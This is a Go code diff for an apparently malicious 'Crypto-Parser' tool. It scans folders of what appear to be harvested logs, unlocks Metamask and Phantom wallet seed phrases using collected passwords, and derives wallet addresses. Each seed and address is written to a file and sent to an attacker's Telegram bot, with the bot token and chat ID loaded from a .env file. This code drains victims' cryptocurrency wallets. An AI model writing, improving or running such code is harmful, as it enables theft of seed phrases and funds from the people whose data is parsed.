@@ -4,20 +4,24 @@ import (
 	"bufio"
 	"fmt"
 	"log"
+	"net/url"
 	"os"
 	"path/filepath"
 	"regexp"
 	"strings"
 	"time"
 
+	"github.com/joho/godotenv"
+
 	"Crypto-Parser/tools"
+	wallet "Crypto-Parser/wallets"
 	"Crypto-Parser/wallets/metamask"
 	"Crypto-Parser/wallets/phantom"
 )
 
-const (
-	tgbotapi string = ""
-	chatid   string = ""
+var (
+	tgbotapi string
+	chatid   string
 )
 
 func main() {
@@ -25,6 +29,14 @@ func main() {
 	if err != nil {
 		fmt.Println("Failed.")
 	}
+
+	err = godotenv.Load(".env")
+	if err != nil {
+		log.Print("Failed to load .env", err)
+	}
+
+	tgbotapi = os.Getenv("TGBOTAPI")
+	chatid = os.Getenv("CHATID")
 
 	extractWalletMnemonics(path)
 }
@@ -43,7 +55,7 @@ func getPath(promt string) (string, error) {
 }
 
 func extractWalletMnemonics(logsPath string) {
-	tools.SendTelegramNotify(tgbotapi, chatid, "Parsing starts...")
+	tools.SendTelegramNotify(tgbotapi, chatid, "Parsing starts…")
 	metamask := metamask.Metamask{}
 	phantom := phantom.Phantom{}
 
@@ -91,22 +103,26 @@ func extractWalletMnemonics(logsPath string) {
 		for _, walletFolder := range walletsDir {
 			if strings.Contains(walletFolder.Name(), "Metamask") {
 				mnemonic, err := metamask.GetMnemonic(filepath.Join(walletsFolderPath, walletFolder.Name()), passwords)
+				addr := wallet.AddrFromSeed(mnemonic)
 				if err != nil {
 					continue
 				}
 				log.Printf("Found metamask %s. Writing to a file", logFolder.Name())
-				textToTelegram := "Found metamask seed-phrase: " + mnemonic
-				tools.SendTelegramNotify(tgbotapi, chatid, textToTelegram)
-				seedFile.WriteString(mnemonic + "\n")
+				textToTelegram := fmt.Sprintf("Found metamask seed: %s\nAdress: %s", mnemonic, addr)
+				escapedText := url.QueryEscape(textToTelegram)
+				tools.SendTelegramNotify(tgbotapi, chatid, escapedText)
+				seedFile.WriteString(fmt.Sprintf("Adress: %s | Seed: %s\n", addr, mnemonic))
 			} else if strings.Contains(walletFolder.Name(), "Phantom") {
 				mnemonic, err := phantom.GetMnemonic(filepath.Join(walletsFolderPath, walletFolder.Name()), passwords)
+				addr := wallet.AddrFromSeed(mnemonic)
 				if err != nil {
 					continue
 				}
 				log.Printf("Found phantom %s. Writing to a file", logFolder.Name())
-				textToTelegram := "Found phantom seed-phrase: " + mnemonic
-				tools.SendTelegramNotify(tgbotapi, chatid, textToTelegram)
-				seedFile.WriteString(mnemonic)
+				textToTelegram := fmt.Sprintf("Found phantom seed: %s\nAdress: %s", mnemonic, addr)
+				escapedText := url.QueryEscape(textToTelegram)
+				tools.SendTelegramNotify(tgbotapi, chatid, escapedText)
+				seedFile.WriteString(fmt.Sprintf("Adress: %s | Seed: %s\n", addr, mnemonic))
 			}
 		}
 	}
